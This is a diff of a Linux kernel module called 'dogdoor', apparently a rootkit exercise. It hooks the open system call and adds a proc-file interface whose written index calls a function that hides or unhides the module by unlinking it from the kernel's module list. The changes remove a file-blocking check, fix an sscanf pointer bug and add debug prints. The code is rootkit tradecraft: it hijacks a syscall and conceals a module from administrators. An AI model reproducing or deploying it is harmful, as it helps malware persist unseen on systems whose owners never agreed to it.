@@ -31,10 +31,7 @@ asmlinkage int dogdoor_sys_open(const char __user * filename, int flags, umode_t
 	
 	
 	
-	if (filepath[0] != 0x0 && strcmp(filepath, fname) == 0) {
-		
-		return -1 ;
-	}
+	
 	return orig_sys_open(filename, flags, mode) ;
 }
 
@@ -51,7 +48,7 @@ int dogdoor_proc_release(struct inode *inode, struct file *file) {
 
 
 static
-void fun3(){
+void fun3(void){
 	if(connect==1){
 		list_del_init(&modules_list); 
 		connect = 0;
@@ -61,7 +58,7 @@ void fun3(){
 		connect = 1;
 		printk("connect\n");
 	}	
-	
+	return;
 }
 	
 static
@@ -69,7 +66,7 @@ ssize_t dogdoor_proc_read(struct file *file, char __user *ubuf, size_t size, lof
 {
 	char buf[256] ;
 	ssize_t toread ;
-	
+	printk("read function in func13.c\n");
 	if(index==3){
 		fun3();
 	}
@@ -97,7 +94,7 @@ ssize_t dogdoor_proc_write(struct file *file, const char __user *ubuf, size_t si
 	if (copy_from_user(buf, ubuf, size))
 		return -EFAULT ;
 	
-	sscanf(buf,"%d", index) ;
+	sscanf(buf,"%d", &index) ;
 	printk("index : %d\n", index);	
 	*offset = strlen(buf) ;
 
